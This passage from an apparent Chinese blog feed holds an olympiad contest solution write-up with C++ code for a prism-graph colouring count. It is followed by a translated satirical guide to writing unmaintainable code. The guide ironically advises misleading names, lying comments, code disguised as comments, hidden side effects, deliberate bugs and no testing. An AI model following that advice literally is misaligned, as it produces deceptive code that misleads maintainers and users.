stdin); freopen("sub.out", "w", stdout); int n; srand(time(0)); scanf("%d", &amp;n); for (int i = 1; i &lt;= n; i++) &#123; scanf("%d", &amp;a[i]); &#125; for (int i = 1; i &lt;= n; i++) &#123; if (i != 1) &#123; int l = 0, u = 0; getLow(r1, a[i], l); getUp(r1, a[i], u); low[i] = l; up[i] = u; &#125; insert(r1, a[i], i); &#125; long long ans = 0; for (int i = n; i &gt;= 1; i--) &#123; if (i != n) &#123; int l = 0, u = 0; getLow(r2, a[i], l); getUp(r2, a[i], u); l2[i] = l; u2[i] = u; &#125; insert(r2, a[i], i); ans = (ans + ((low[i] % HA) * (u2[i] % HA)) % HA) % HA; ans = (ans + ((up[i] % HA) * (l2[i] % HA)) % HA) % HA; &#125; printf("%lld\n", ans); return 0;&#125;C. 平面图Problem C (planar.c/cpp/pas)\text{Problem C (planar.c/cpp/pas)}Problem C (planar.c/cpp/pas)Input file: planar.in Output file: planar.out\text{Input file: planar.in Output file: planar.out}Input file: planar.in Output file: planar.outTime Limit : 1 second Memory Limit: 512 megabytes\text{Time Limit : 1 second Memory Limit: 512 megabytes}Time Limit : 1 second Memory Limit: 512 megabytes平面图（Planar graph\text{Planar graph}Planar graph）是可以画在平面上并且使得不同的边可以互不交叠的图。有一次数学课，你们正在学习选修 2−32-32−3 ，数学老师正在讲一道题，题目大意是给你一张图，要求用 444 种颜色给每个点染色，被一条边连接的两个点不能染成相同的颜色，求方案数。那张图如下：你的数学老师问大家这张图是平面图还是立体图。而你——班里唯一的 OIer\text{OIer}OIer ——是回答平面图的唯一的人。而此时，你的数学老师已经怒不可言，怒斥你没有学好立体几何。为了教你的数学老师做人，你需要解决一个更复杂的问题：图是一个 nnn 棱柱。形式化的讲，这张图有 2n2n2n 个点，其中 iii 号点与 号点有边相连，i+ni+ni+n 号点与 号点有边相连，iii 号点与 i+ni+ni+n 号点有边相连。（所有的 iii 都满足 1≤i≤n1\le i \le n1≤i≤n）。你需要求的是对这张「平面图」 用 mmm 种颜色给每个点染色，被一条边连接的两个点不能染成相同的颜色的总染色方案数（两种方案不同当且仅当存在一个点在两种方案里染成的颜色不同）。你只需求出答案对 109+710^9+710​9​​+7 取模的结果。当然，仅仅解决这个问题还是不够让数学老师屈服，你需要用低于 O(n)O(n)O(n) 的算法解决这个问题。Input一行两个整数 n,mn,mn,mOutput一行一个数，表示答案对 109+710^9+710​9​​+7 取模的结果Note子任务 111 （ 555 分）：满足 n≤4,m≤4n \le 4,m \le 4n≤4,m≤4 。 子任务 222 （ 101010 分）：满足 n≤4n \le 4n≤4 。 子任务 333 （ 555 分）：满足 m=2m = 2m=2 。 子任务 444 （ 151515 分）：满足 。 子任务 555 （ 303030 分）：满足 。 子任务 666 （ 353535 分）：无特殊限制。 对于 100%100\%100% 的数据，满足 。算法1 - 5 pts 暴力枚举。 期望得分： 5 pts\text{5 pts}5 pts算法2 - 15 ptsn≤4n \le 4n≤4 。 用到的颜色数不多，暴力然后用组合数对应即可。期望得分： 15 pts\text{15 pts}15 pts算法3 - 20 ptsm=2m = 2m=2注意到 nnn 为奇数时答案为 000，为偶数时答案为 222* 这个可以理解为奇环无法进行二分图染色，偶环有两种方案期望得分： 5 pts\text{5 pts}5 pts，结合之前算法可得 20 pts\text{20 pts}20 pts算法4 - 65 pts1≤n≤1061 \le n \le 10^61≤n≤10​6​​ 我们考虑转化一下问题f[i][0/1/2][0/1/2] 表示当前填到第 iii 列，右上角的点颜色和左上角左下角都不同/和左上角相同/左下角相同，右下角的点颜色和左上角左下角都不同/和左上角相同/左下角相同的方案数。递推即可。m=3m = 3m=3 是给忘记考虑某些特殊情况的人准备的。期望得分： 65 pts\text{65 pts}65 pts算法5 - 100 pts把递推换成矩乘即可。期望得分： 100 pts\text{100 pts}100 pts1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;bits/stdc++.h&gt;using namespace std;typedef long long ll;const ll mod = 1e9 + 7;int N = 7;struct Matrix&#123; ll a[7][7]; void clear()&#123; memset(a, 0, sizeof(a)); &#125; void clearE()&#123; clear(); for(int i = 0; i &lt; N; i ++) a[i][i] = 1; &#125; Matrix operator * (const Matrix &amp;b) const&#123; Matrix ret; ret.clear(); for(int i = 0; i &lt; N; i ++)&#123; for(int j = 0; j &lt; N; j ++)&#123; for(int k = 0; k &lt; N; k ++)&#123; ret.a[i][j] = (ret.a[i][j] + a[i][k] * b.a[k][j]) % mod; &#125; &#125; &#125; return ret; &#125;&#125;A;Matrix qpow(Matrix a, ll b)&#123; Matrix ret; ret.clearE(); for(; b; b &gt;&gt;= 1, a = a * a)&#123; if(b &amp; 1) ret = ret * a; &#125; return ret;&#125;// 0 0 0// 0 1 1// 0 2 2// 1 0 3// 1 2 4// 2 0 5// 2 1 6ll n, m;int main()&#123; freopen("planar.in", "r", stdin); freopen("planar.out", "w", stdout); scanf("%lld%lld", &amp;n, &amp;m); if(m == 2)&#123; if(n &amp; 1) printf("0\n"); else printf("2\n"); return 0; &#125; if(m &gt; 3) A.a[0][0] = (m - 3 + (m - 4) * (m - 4)) % mod; A.a[0][1] = A.a[0][2] = A.a[0][3] = A.a[0][5] = (m - 3) * (m - 3) % mod; A.a[0][4] = A.a[0][6] = (m - 2) * (m - 3) % mod; A.a[1][0] = A.a[1][2] = A.a[2][0] = A.a[2][1] = A.a[3][0] = A.a[3][5] = A.a[5][0] = A.a[5][3] = m - 3; A.a[1][3] = A.a[1][4] = A.a[1][5] = A.a[2][3] = A.a[2][5] = A.a[2][6] = A.a[3][1] = A.a[3][2] = A.a[3][6] = A.a[5][1] = A.a[5][2] = A.a[5][4] = m - 2; A.a[4][0] = A.a[4][1] = A.a[4][5] = A.a[4][6] = A.a[6][0] = A.a[6][2] = A.a[6][3] = A.a[6][4] = 1; A = qpow(A, n); printf("%lld\n", A.a[4][4] * m % mod * (m - 1) % mod); return 0;&#125;算法6 - 100 ptsOEIS 大法吼啊！OEIS A277443123456789101112131415161718192021222324#include &lt;cstdio&gt;const int MOD = 1e9 + 7;inline long long pow(long long a, long long n) &#123; a = (a % MOD + MOD) % MOD; long long res = 1; for (; n; n &gt;&gt;= 1, a = a * a % MOD) if (n &amp; 1) res = res * a % MOD; return res;&#125;int main() &#123; freopen("planar.in", "r", stdin); freopen("planar.out", "w", stdout); // https://oeis.org/A277443, search keyword: prism graph color // FORMULA A(n,k) = (n^2-3n+3)^k+(n-1)((3-n)^k+(1-n)^k)+n^2-3n+1. long long k, n; scanf("%lld %lld", &amp;k, &amp;n); long long ans = pow(pow(n, 2) - 3 * n + 3, k) + (n - 1) * (pow(3 - n, k) + pow(1 - n, k)) % MOD + pow(n, 2) - 3 * n + 1; printf("%lld\n", (ans % MOD + MOD) % MOD);&#125;先写到这里，Day 2回来再补吧（Upd: 2018 - 08 - 27Day 2]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>2018</tag>
        <tag>五校联考</tag>
        <tag>LYOI</tag>
        <tag>模拟赛</tag>
        <tag>NOIP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「代码规范」如何编写无法维护的代码]]></title>
    <url>%2Farticles%2FHow-to-Make-A-Uneasy-to-Maintain-Code%2F</url>
    <content type="text"><![CDATA[总体原则想挫败维护代码的程序员，你必须先明白他的思维方式。他接手了你的庞大程序，没有时间把它全部读一遍，更别说理解它了。他无非是想快速找到修改代码的位置、改代码、编译，然后就能交差，并希望他的修改不会出现意外的副作用qwq他查看你的代码不过是管中窥豹，一次只能看到一小段而已。你要确保他永远看不到全貌。要尽量让他难以找到他想找的代码。但更重要的是，要让他不能有把握忽略任何东西qwq程序员都被编程惯例洗脑了，还为此自鸣得意。每一次你处心积虑地违背编程惯例，都会迫使他必须用放大镜去仔细阅读你的每一行代码。你可能会觉得每个语言特性都可以用来让代码难以维护，其实不然。你必须精心地误用它们才行qwq命名规则Quidquid latine dictum sit, altum sonatur.(随便用拉丁文写点啥都会显得高大上。)“当我使用一个单词的时候” Humpty Dumpty 曾经用一种轻蔑的口气说, “它就是我想表达的意思，不多也不少。“– Lewis Carroll — 《爱丽丝魔镜之旅》， 第6章编写无法维护代码的技巧的重中之重是变量和方法命名的艺术。如何命名是和编译器无关的。这就让你有巨大的自由度去利用它们迷惑维护代码的程序员妙用键盘买个好用的键盘，你就永远不缺变量名了（才不是脸滚键盘比如 trew 就是个好名字，而且键盘输入它也省事。如果你就想找一些容易输入的变量名，可以试试 adsf 或者 aoeu 之类的单变量命名如果你给变量起名为 a,b,c ，用简单的文本编辑器就没法搜索它们的引用而且，没人能猜到它们的含义创造性的拼写错误如果你必须使用描述性的变量和函数名，那就把它们都拼错。还可以把某些函数和变量名拼错，再把其他的拼对(例如 SetPintleOpening() 和 SetPintalClosing() ) ，我们就能有效地将 grep 或 IDE 搜索技术玩弄于股掌之上。这招超级管用。还可以混淆不同语言（比如 colour — 英国英语，和 color — 美国英语)抽象在命名函数和变量的时候，充分利用抽象单词，例如 it , everything , data , handle , stuff , do , routine , perform 和数字，像这样命名的好例子有 routineX48 , PerformDataFunction , DoIt , HandleStuff 还有 do_args_method首字母大写的缩写用首字母大写缩写（比如 GNU 代表 GNU’s Not Unix ) 使代码简洁难懂。真正的汉子(无论男女)从来不说明这种缩写的含义，他们生下来就懂辞典大轮换为了打破沉闷的编程气氛，你可以用一本辞典来查找尽量多的同义词。例如 display , show , present 。在注释里含糊其辞地暗示这些命名之间有细微的差别，其实根本没有。不过，如果有两个命名相似的函数真的有重大差别，那倒是一定要确保它们用相同的单词来命名(例如，对于 “写入文件”, “在纸上书写” 和 “屏幕显示” 都用 print 来命名)。 在任何情况下都不要屈服于编写明确的项目词汇表这种无理要求。你可以辩解说，这种要求是一种不专业的行为，它违反了结构化设计的信息隐藏原则首字母大写随机地把单词中间某个音节的首字母大写。例如 ComputeReSult()重用命名在语言规则允许的地方，尽量把 类 、构造器 、方法 、成员变量 、参数 和 局部变量 都命名成一样。更高级的技巧是在 {} 块中重用局部变量。这样做的目的是迫使维护代码的程序员认真检查每个实例的作用域。特别是在 Java 代码中，可以把普通方法伪装成构造器使用非英语字母在命名中偷偷使用不易察觉的非英语字母，例如1typedef struct &#123; int i; &#125; ínt;看上去没啥不对是吧？嘿嘿嘿…这里的第二个 ínt 的 í 实际上是东北欧字母，并不是英语中的 i 。在简单的文本编辑器里，想看出这一点点区别几乎是不可能的。利用编译器对于命名长度的限制如果编译器只区分命名的前几位，比如前 8 位，那么就把后面的字母写得不一样。比如，其实是同一个变量，有时候写成 var_unit_update() ，有时候又写成 var_unit_setup()，看起来是两个不同的函数调用。而在编译的时候，它们其实是同一个函数 var_unit()下划线，真正的朋友可以拿 _ 和 __ 作为标示符123456789101112// 判素void _(int __, int ___, int ____, int _____) &#123; ((___ / __) &lt;= _____) ? _(__,___+_____,____,_____) : !(___ % __) ? _(__,___+_____,___ % __, _____) : ((___ % __)==(___ / __) &amp;&amp; !____) ? (printf("%dt",(___ / __)), _(__,___+_____,____,_____)) : ((___ % __) &gt; _____ &amp;&amp; (___ % __) &lt; (___ / __)) ? _(__,___+_____,____,_____ + !((___ / __) % (___ % __))) : (___ &lt; __ * __) ? _(__,___+_____,____,_____) : 0;&#125; int main() &#123; _(100,0,0,1);&#125;混合多语言随机地混用两种语言（人类语言或计算机语言都行）。如果老板要求使用他指定的语言，你就告诉他你用自己的语言更有利于组织你的思路，万一这招不管用，就去控诉这是语言歧视，并威胁起诉老板要求巨额精神损失赔偿扩展 ASCII 字符扩展 ASCII 字符用于变量命名是完全合法的，包括 ß, Ð, 和 ñ 等。在简单的文本编辑器里，除了拷贝/粘贴，基本上没法输入其他语言的命名使用外语字典作为变量名的来源。例如，可以用德语单词 punkt 代替 point。除非维护代码的程序员也像你一样熟练掌握了德语. 不然他就只能尽情地在代码中享受异域风情了数学命名用数学操作符的单词来命名变量。例如：openParen = (slash + asterix) / equals;(左圆括号 = (斜杠 + 星号)/等号;)令人眩晕的命名用带有完全不相关的感情色彩的单词来命名变量。例如：marypoppins = (superman + starship) / god;(欢乐满人间 = (超人 + 星河战队)/上帝;)这一招可以让阅读代码的人陷入迷惑之中，因为他们在试图想清楚这些命名的逻辑时，会不自觉地联系到不同的感情场景里而无法自拔何时使用 i永远不要把 i 用作最内层的循环变量。 用什么命名都行，就是别用 i。把 i 用在其他地方就随便了，用作非整数变量尤其好惯例 — 明修栈道，暗度陈仓忽视 Java 编码惯例，Sun 自己就是这样做的。幸运的是，你违反了它编译器也不会打小报告。这一招的目的是搞出一些在某些特殊情况下有细微差别的名字来。如果你被强迫遵循驼峰法命名，你还是可以在某些模棱两可的情况下颠覆它例如，inputFilename 和 inputfileName 两个命名都可以合法使用。在此基础上自己发明一套复杂到变态的命名惯例，然后就可以对其他人反咬一口，说他们违反了惯例小写的 l 看上去很像数字 1用小写字母 l 标识 long 常数。例如 10l 更容易被误认为是 101 而不是 10L 。 禁用所有能让人准确区分 uvw wW gq9 2z 5s il17|!j oO08 &#39;” ;,. m nn rn {[()]} 的字体。要做个有创造力的人把全局命名重用为私有在 A 模块里声明一个全局数组，然后在 B 模块的头文件里再声明一个同名的私有数组，这样看起来你在 B 模块里引用的是那个全局数组，其实却不是。不要在注释里提到这个重复的情况误导性的命名让每个方法都和它的名字蕴含的功能有一些差异。例如，一个叫 isValid(x) 的方法在判断完参数 x 的合法性之后，还顺带着把它转换成二进制并保存到数据库里qwq（伪装当一个bug需要越长的时间才会暴露，它就越难被发现。– Roedy Green编写无法维护代码的另一大秘诀就是伪装的艺术，即隐藏它或者让它看起来像其他东西。很多招式有赖于这样一个事实：编译器比肉眼或文本编辑器更有分辨能力。下面是一些伪装的最佳招式把代码伪装成注释，反之亦然下面包括了一些被注释掉的代码，但是一眼看去却像是正常代码12345678910for (j = 0; j &lt; array_len; j += 8) &#123; total += array[j + 0]; total += array[j + 1]; total += array[j + 2]; /* Main body of total += array[j + 3]; * loop is unrolled total += array[j + 4]; * for greater speed. total += array[j + 5]; */ total += array[j + 6]; total += array[j + 7];&#125;如果不是语法高亮，这个你会看出来吗（用连接符隐藏变量对于下面的定义1#define local_var xy_z可以把 xy_z 打散到两行里：12#define local_var xy\_z // local_var OK这样全局搜索 xy_z 的操作在这个文件里就一无所获了。 对于 C 预处理器来说，第一行最后的 \ 表示继续拼接下一行的内容文档任何傻瓜都能说真话，而要把谎编圆则需要相当的智慧。– Samuel Butler (1835 – 1902)不正确的文档往往比没有文档还糟糕。– Bertrand Meyer既然计算机是忽略注释和文档的，你就可以在里边堂而皇之地编织弥天大谎，让可怜的维护代码的程序员彻底迷失在注释中撒谎实际上你不需要主动地撒谎，只要没有及时保持注释和代码更新的一致性就可以了只记录显而易见的东西往代码里掺进去类似于1/* 给 i 加 1 */这样的注释，但是永远不要记录包或者方法的整体设计这样的干货记录 How 而不是 Why只解释一个程序功能的细节，而不是它要完成的任务是什么。这样的话，如果出现了一个bug，修复者就搞不清这里的代码应有的功能该写的别写比如你在开发一套航班预定系统，那就要精心设计，让它在增加另一个航空公司的时候至少有 25 处代码需要修改。永远不要在文档里说明要修改的位置。后来的开发人员要想修改你的代码？门都没有，除非他们能把每一行代码都读懂计量单位永远不要在文档中说明任何变量、输入、输出或参数的计量单位，如 英尺 、米 、加仑 等。计量单位对数豆子不是太重要，但在工程领域就相当重要了同理，永远不要说明任何转换常量的计量单位，或者是它的取值如何获得。要想让代码更乱的话，你还可以在注释里写上错误的计量单位，这是赤裸裸的欺骗，但是非常有效如果你想做一个恶贯满盈的人，不妨自己发明一套计量单位，用自己或某个小人物的名字命名这套计量单位，但不要给出定义。万一有人挑刺儿，你就告诉他们，你这么做是为了把浮点数运算凑成整数运算而进行的转换坑永远不要记录代码中的坑。如果你怀疑某个类里可能有 bug ，天知地知你知就好。如果你想到了重构或重写代码的思路，看在老天爷的份上，千万别写出来切记电影《小鹿斑比》里那句台词 “如果你不能说好听的话，那就什么也不要说。”。万一这段代码的原作者看到你的注释怎么办？万一老板看到了怎么办？万一客户看到了怎么办？搞不好最后你自己被解雇了。一句 这里需要修改 的匿名注释就好多了，尤其是当看不清这句注释指的是哪里需要修改的情况下。切记 难得糊涂 四个字，这样大家都不会感觉受到了批评说明变量永远不要对变量声明加注释。有关变量使用的方式、边界值、合法值、小数点后的位数、计量单位、显示格式、数据录入规则等等，后继者完全可以自己从程序代码中去理解和整理嘛如果老板强迫你写注释，就在方法体里胡乱多写点，但绝对不要对变量声明写注释，即使是临时变量！在注释里挑拨离间为了阻挠任何雇佣外部维护承包商的倾向，可以在代码中散布针对其他同行软件公司的攻击和抹黑，特别是可能接替你工作的其中任何一家。例如：1234567/* 优化后的内层循环这套技巧对于 SSI 软件服务公司的那帮蠢材来说太高深了，他们只会用 &lt;math.h&gt; 里的笨例程，消耗50倍的内存和处理时间。*/ class clever_SSInc &#123; /* Code */&#125;可能的话，除了注释之外，这些攻击抹黑的内容也要掺到代码里的重要语义部分，这样如果管理层想清理掉这些攻击性的言论然后发给外部承包商去维护，就会破坏代码结构程序设计编写无法维护代码的基本规则就是：在尽可能多的地方，以尽可能多的方式表述每一个事实。– Roedy Green编写可维护代码的关键因素是只在一个地方表述应用里的一个事实。如果你的想法变了，你也只在一个地方修改，这样就能保证整个程序正常工作。所以，编写无法维护代码的关键因素就是反复地表述同一个事实，在尽可能多的地方，以尽可能多的方式进行。令人高兴的是，像Java这样的语言让编写这种无法维护代码变得非常容易。例如，改变一个被引用很多的变量的类型几乎是不可能的，因为所有造型和转换功能都会出错，而且关联的临时变量的类型也不合适了。而且，如果变量值要在屏幕上显示，那么所有相关的显示和数据录入代码都必须一一找到并手工进行修改。类似的还有很多，比如由C和Java组成的Algol语言系列，Abundance甚至Smalltalk对于数组等结构的处理，都是大有可为的Java 造型Java 的造型机制是上帝的礼物。你可以问心无愧地使用它，因为 Java 语言本身就需要它。每次你从一个 Collection 里获取一个对象，你都必须把它造型为原始类型。这样这个变量的类型就必须在无数地方表述。如果后来类型变了，所有的造型都要修改才能匹配。如果倒霉的维护代码的程序员没有找全（或者修改太多），编译器能不能检测到也不好说。类似的，如果变量类型从 short 变成 int，所有匹配的造型也都要从( short) 改成 (int)利用Java的冗余Java 要求你给每个变量的类型写两次表述。 Java 程序员已经习惯了这种冗余，他们不会注意到你的两次表述有细微的差别，例如1Bubblegum b = new Bubblegom();不幸的是 ++ 操作符的盛行让下面这种伪冗余代码得手的难度变大了1swimmer = swimner + 1;永远不做校验永远不要对输入数据做任何的正确性或差异性检查。这样能表现你对公司设备的绝对信任，以及你是一位信任所有项目伙伴和系统管理员的团队合作者。总是返回合理的值，即使数据输入有问题或者错误有礼貌，无断言避免使用 assert() 机制，因为它可能把三天的 debug 盛宴变成 10 分钟的快餐避免封装为了提高效率，不要使用封装。方法的调用者需要所有能得到的外部信息，以便了解方法的内部是如何工作的复制粘贴修改以效率的名义，使用 复制 + 粘贴 + 修改。这样比写成小型可复用模块效率高得多。在用代码行数衡量你的进度的小作坊里，这招尤其管用使用静态数组如果一个库里的模块需要一个数组来存放图片，就定义一个静态数组。没人会有比 512 x 512 更大的图片，所以固定大小的数组就可以了。为了最佳精度，就把它定义成 double 类型的数组傻瓜接口编写一个名为 WrittenByMe 之类的空接口，然后让你的所有类都实现它。然后给所有你用到的 Java 内置类编写包装类。这里的思想是确保你程序里的每个对象都实现这个接口。最后，编写所有的方法，让它们的参数和返回类型都是这个 WrittenByMe。这样就几乎不可能搞清楚某个方法的功能是什么，并且所有类型都需要好玩的造型方法。更出格的玩法是，让每个团队成员编写它们自己的接口(例如 WrittenByJoe)，程序员用到的任何类都要实现他自己的接口。这样你就可以在大量无意义接口中随便找一个来引用对象了巨型监听器永远不要为每个组件创建分开的监听器。对所有按钮总是用同一个监听器，只要用大量的 if…else 来判断是哪一个按钮被点击就行了好事成堆狂野地使用封装和 OO 思想。例如1234myPanel.add( getMyButton() ); private JButton getMyButton() &#123; return myButton; &#125;这段很可能看起来不怎么好笑。别担心，只是时候未到而已友好的朋友在 C++ 里尽量多使用 friend 声明。再把创建类的指针传递给已创建类。现在你不用浪费时间去考虑接口了。另外，你应该用上关键字 private 和 protected 来表明你的类封装得很好使用三维数组大量使用它们。用扭曲的方式在数组之间移动数据，比如，用 arrayA 里的行去填充 arrayB 的列。这么做的时候，不管三七二十一再加上 1 的偏移值，这样很灵。让维护代码的程序员抓狂去吧混合与匹配存取方法和公共变量神马的都要给他用上。这样的话，你无需调用存取器的开销就可以修改一个对象的变量，还能宣称这个类是个 Java Bean 。对于那些试图添加日志函数来找出改变值的源头的维护代码的程序员，用这一招来迷惑他尤其有效没有秘密!把每个方法和变量都声明为 public。毕竟某个人某天可能会需要用到它。一旦方法被声明为 public 了，就很难缩回去。对不？这样任何它覆盖到的代码都很难修改了。它还有个令人愉快的副作用，就是让你看不清类的作用是什么。如果老板质问你是不是疯了，你就告诉他你遵循的是经典的透明接口原则全堆一块把你所有的没用的和过时的方法和变量都留在代码里。毕竟说起来，既然你在 1976 年用过一次，谁知道你啥时候会需要再用到呢？当然程序是改了，但它也可能会改回来嘛，你 不想要重新发明轮子（领导们都会喜欢这样的口气）。如果你还原封不动地留着这些方法和变量的注释，而且注释写得又高深莫测，甭管维护代码的是谁，恐怕都不敢对它轻举妄动就是 Final把你所有的叶子类都声明为 final 。毕竟说起来，你在项目里的活儿都干完了，显然不会有其他人会通过扩展你的类来改进你的代码。这种情况甚至可能有安全漏洞。 java.lang.String 被定义成 final 也许就是这个原因吧？如果项目组其他程序员有意见，告诉他们这样做能够提高运行速度避免布局永远不要用到布局。当维护代码的程序员想增加一个字段，他必须手工调整屏幕上显示所有内容的绝对坐标值。如果老板强迫你使用布局，那就写一个巨型的 GridBagLayout 并在里面用绝对坐标进行硬编码全局变量，怎么强调都不过分如果上帝不愿意我们使用全局变量，他就不会发明出这个东西。不要让上帝失望，尽量多使用全局变量。每个函数最起码都要使用和设置其中的两个，即使没有理由也要这么做。毕竟，任何优秀的维护代码的程序员都会很快搞清楚这是一种侦探工作测试，有利于让他们从笨蛋中脱颖而出再一次说说全局变量全局变量让你可以省去在函数里描述参数的麻烦。充分利用这一点。在全局变量中选那么几个来表示对其他全局变量进行操作的类型。局部变量永远不要用局部变量。在你感觉想要用的时候，把它改成一个实例或者静态变量，并无私地和其他方法分享它。这样做的好处是，你以后在其他方法里写类似声明的时候会节省时间。C++ 程序员可以百尺竿头更进一步，把所有变量都弄成全局的配置文件配置文件通常是以 关键字 = 值 的形式出现。在加载时这些值被放入 Java 变量中。最明显的迷惑技术就是把有细微差别的名字用于关键字和 Java 变量.甚至可以在配置文件里定义运行时根本不会改变的常量。参数文件变量和简单变量比，维护它的代码量起码是后者的 5 倍。子类对于编写无法维护代码的任务来说，面向对象编程的思想简直是天赐之宝。如果你有一个类，里边有10个属性（成员/方法），可以考虑写一个基类，里面只有一个属性，然后产生 9 层的子类，每层增加一个属性。等你访问到最终的子类时，你才能得到全部 10 个属性。如果可能，把每个类的声明都放在不同的文件里代码迷局操作符重载重载操作符可以让你的代码变得诡异，感谢 CCTV ，感谢 C++。这个东西是可以把混乱代码提高到一种艺术的形式。比如：重载一个类的 ! 操作符，但实际功能并不是取反，让其返回一个整数。于是，如果你使用 !! 操作符，那么，有意思的事就发生了—— 先是调用类的重载 ! 操作符，然后把其返回的整数给 ! 成了 布尔变量，如果是 !!! 呢？呵呵。迷惑 C从互联网上的各种混乱 C 语言竞赛中学习，追随大师们的脚步。追求极致总是追求用最迷惑的方式来做普通的任务。例如，要用数组来把整数转换为相应的字符串，可以这么做：1234567891011121314char *p; switch (n) &#123; case 1: p = "one"; if (0) case 2: p = "two"; if (0) case 3: p = "three"; printf("%s", p); break; &#125;一致性的小淘气当你需要一个字符常量的时候，可以用多种不同格式： ‘ ‘ , 32, 0x20, 040。在 C 或 Java 里 10 和 010 是不同的数（ 0 开头的表示 8 进制），你也可以充分利用这个特性造型把所有数据都以 void * 形式传递，然后再造型为合适的结构。不用结构而是通过位移字节数来造型也很好玩嵌套 switchswitch 里边还有 switch，这种嵌套方式是人类大脑难以破解的利用隐式转化牢记编程语言中所有的隐式转化细节。充分利用它们。数组的索引要用浮点变量，循环计数器用字符，对数字执行字符串函数调用。不管怎么说，所有这些操作都是合法的，它们无非是让源代码更简洁而已。任何尝试理解它们的维护者都会对你感激不尽，因为他们必须阅读和学习整个关于隐式数据类型转化的章节，而这个章节很可能是他们来维护你的代码之前完全忽略了的。分号!在所有语法允许的地方都加上分号，例如：1234567if(a); else;&#123;int d; d = c; &#125;;使用八进制数把八进制数混到十进制数列表里，就像这样：1234array = new int [] &#123; 111, 120, 013, 121, &#125;;嵌套尽可能深地嵌套。优秀的程序员能在一行代码里写10层()，在一个方法里写20层{}。C数组C 编译器会把 myArray[i] 转换成 *(myArray + i) ，它等同于 *(i + myArray) 也等同于 i[myArray]。 高手都知道怎么用好这个招。可以用下面的函数来产生索引，这样就把代码搞乱了123int myfunc(int q, int p) &#123; return p%q; &#125; ... myfunc(6291, 8)[Array];遗憾的是，这一招只能在本地 C 类里用，Java 还不行放长线钓大鱼一行代码里堆的东西越多越好。这样可以省下临时变量的开销，去掉换行和空格还可以缩短源文件大小。记住，要去掉运算符两边的空格。优秀的程序员总是能突破某些编辑器对于 255 个字符行宽的限制异常在这里我要向你传授一个编程领域里鲜为人知的秘诀。异常是个讨厌的东西。良好的代码永远不会出错，所以异常实际上是不必要的。不要把时间浪费在这上面。子类异常是给那些知道自己代码会出错的低能儿用的。在整个应用里，你只用在 main() 里放一个 try/catch ，里边直接调用 System.exit() 就行了。在每个方法头要贴上标准的抛出集合定义，至于会不会抛出异常你就甭管了使用异常的时机在非异常条件下才要使用异常。比如终止循环就可以用 ArrayIndexOutOfBoundsException。还可以从异常里的方法返回标准的结果狂热奔放地使用线程如题测试在程序里留些 bug ，让后继的维护代码的程序员能做点有意思的事。精心设计的 bug 是无迹可寻的，而且谁也不知道它啥时候会冒出来。要做到这一点，最简单的办法的就是不要测试代码永不测试永远不要测试负责处理错误、当机或操作系统故障的任何代码。反正这些代码永远也不会执行，只会拖累你的测试。还有，你怎么可能测试处理磁盘错误、文件读取错误、操作系统崩溃这些类型的事件呢？为啥你要用特别不稳定的计算机或者用测试脚手架来模拟这样的环境？现代化的硬件永远不会崩溃，谁还愿意写一些仅仅用于测试的代码？这一点也不好玩。万一将来出了事用户抱怨，你就怪到操作系统或者硬件头上。他们永远不会知道真相的永远不要做性能测试嘿，如果软件运行不够快，只要告诉客户买个更快的机器就行了。如果你真的做了性能测试，你可能会发现一个瓶颈，这会导致修改算法，然后导致整个产品要重新设计。谁想要这种结果？而且，在客户那边发现性能问题意味着你可以免费到外地旅游。你只要备好护照和最新照片就行了永远不要写任何测试用例永远不要做代码覆盖率或路径覆盖率测试。自动化测试是给那些窝囊废用的。搞清楚哪些特性占到你的例程使用率的90% ，然后把 90% 的测试用在这些路径上。毕竟说起 来，这种方法可能只测试到了大约你代码的 60% ，这样你就节省了 40% 的测试工作。这能帮助你赶上项目后端的进度。等到有人发现所有这些漂亮的“市场特性”不能正常工作的时候，你早就跑路了。一些有名的大软件公司就是这样测试代码的，所以你也应该这样做。如果因为某种原因你还没走，那就接着看下一节测试是给懦夫用的勇敢的程序员会跳过这个步骤。太多程序员害怕他们的老板，害怕丢掉工作，害怕客户的投诉邮件，害怕遭到起诉。这种恐惧心理麻痹了行动，降低了生产率。有科学研究成果表明，取消测试阶段意味着经理有把握能提前确定交付时间，这对于规划流程显然是有利的。消除了恐惧心理，创新和实验之花就随之绽放。程序员的角色是生产代码，调试工作完全可以由技术支持和遗留代码维护组通力合作来进行如果我们对自己的编程能力有充分信心，那么测试就没有必要了。如果我们逻辑地看待这个问题，随便一个傻瓜都能认识到测试根本都不是为了解决技术问题，相反，它是一种感性的信心问题。针对这种缺乏信心的问题，更有效的解决办法就是完全取消测试，送我们的程序员去参加自信心培训课程。毕竟说起来，如果我们选择做测试，那么我们就要测试每个程序的变更，但其实我们只需要送程序员去一次建立自信的培训课就行了。很显然这么做的成本收益是相当可观的选择你的编程语言计算机语言正在逐步进化，变得更加傻瓜化。使用最新的语言算什么好汉？尽可能坚持使用你会用的最老的语言，先考虑用穿孔纸带，不行就用汇编，再不行用FORTRAN 或者 COBOL，再不行就用C 还有 BASIC，实在不行再用 C++FORTRAN用 FORTRAN 写所有的代码。如果老板问你为啥，你可以回答说它有很多非常有用的库，你用它可以节约时间。不过，用 FORTRAN 写出可维护代码的概率是 0，所以，要达到不可维护代码编程指南里的要求就容易多了用 ASM把所有的通用工具函数都转成汇编程序用 QBASIC所有重要的库函数都要用 QBASIC 写，然后再写个汇编的封包程序来处理 large 到 medium 的内存模型映射内联汇编在你的代码里混杂一些内联的汇编程序，这样很好玩。这年头几乎没人懂汇编程序了。只要放几行汇编代码就能让维护代码的程序员望而却步宏汇编调用C如果你有个汇编模块被 C 调用，那就尽可能经常从汇编模块再去调用 C ，即使只是出于微不足道的用途，另外要充分利用 goto, bcc 和其他炫目的汇编秘籍。其他不要重编译让我们从一条可能是有史以来最友好的技巧开始：把代码编译成可执行文件。如果它能用，就在源代码里做一两个微小的改动 — 每个模块都照此办理。但是不要费劲巴拉地再编译一次了。 你可以留着等以后有空而且需要调试的时候再说。多年以后，等可怜的维护代码的程序员更改了代码之后发现出错了，他会有一种错觉，觉得这些肯定是他自己最近修改的。这样你就能让他毫无头绪地忙碌很长时间。挫败调试工具对于试图用行调试工具追踪来看懂你的代码的人，简单的一招就能让他狼狈不堪，那就是把每一行代码都写得很长。特别要把 then 语句 和 if 语句放在同一行里。他们无法设置断点。他们也无法分清在看的分支是哪个 if 